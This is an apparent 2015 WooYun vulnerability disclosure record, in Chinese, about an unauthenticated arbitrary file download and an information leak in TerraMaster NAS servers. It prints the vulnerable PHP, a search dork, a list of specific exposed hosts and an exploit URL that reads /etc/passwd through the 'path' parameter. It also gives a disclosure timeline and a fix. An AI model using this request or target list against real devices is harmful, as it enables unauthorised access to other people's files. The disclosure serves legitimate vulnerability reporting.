{"id": 35843, "wybug_id": "wooyun-2015-0103070", "wybug_title": "TerraMaster NAS网络存储服务器任意文件下载及信息泄漏漏洞", "wybug_corp": "铁威马", "wybug_author": "路人甲", "wybug_date": "2015-03-30 13:54", "wybug_open_date": "2015-07-02 14:42", "wybug_type": "非授权访问", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-06：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-02：\t细节向公众公开  简要描述： TerraMaster NAS网络存储服务器存在任意文件下载及信息泄漏漏洞 详细说明：  任意文件下载：在/cgi-bin/filemanage/view.php中，没有对访问者进行身份认证，同时对用户输入的变量没有进行必要的过滤检查，导致恶意访问者可以未经授权下载任意文件。该view.php文件仅存在于TerraMaster较高版本中。代码如下：<?phpclass imgdata{        public $imgsrc;        public $imgdata;        public $imgform;        public function getdir($source){                $this->imgsrc  = $source;        }        public function img2data(){                $this->_imgfrom($this->imgsrc);                return $this->imgdata=fread(fopen($this->imgsrc,'rb'),filesize($this->imgsrc));               }        public function data2img(){                header(\"content-type:$this->imgform\");                echo $this->imgdata;                //echo $this->imgform;                //imagecreatefromstring($this->imgdata);        }        public function _imgfrom($imgsrc){                $info=getimagesize($imgsrc);                //var_dump($info);                return $this->imgform = $info['mime'];        }}$n = new imgdata;$n -> getdir($_REQUEST['path']);$n -> img2data();$n -> data2img();?>访问者可以完全控制path变量以获取自己感兴趣的文件内容。信息泄漏：在/cgi-bin/filemanage/index.php中，没有对访问者进行身份认证，任意用户访问该文件时可显示NAS中的具体文件信息，尽管有弹出用户名及口令输入框，可按Esc取消即可看到全部文件信息，但无法进入子目录查看。   漏洞证明：  谷歌可搜索：\"TerraMaster 系统管理\"\n\n（遮挡部分为个人信息，在此抹去）例子：(借用YY2012在 WooYun: TerraMaster NAS网络存储服务器无限制getshell等漏洞（附poc） 中的例子)http://mxfor.com/http://sdsgv1.oicp.net:8181/http://222.35.41.77:8181/http://58.18.131.8/http://218.8.130.130:8080/http://IP:PORT/cgi-bin/filemanage/view.php?path=/etc/passwd   修复方案：  身份认证，输入内容过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-04-03 14:40 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过电话和邮件方式向软件生产厂商直接通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}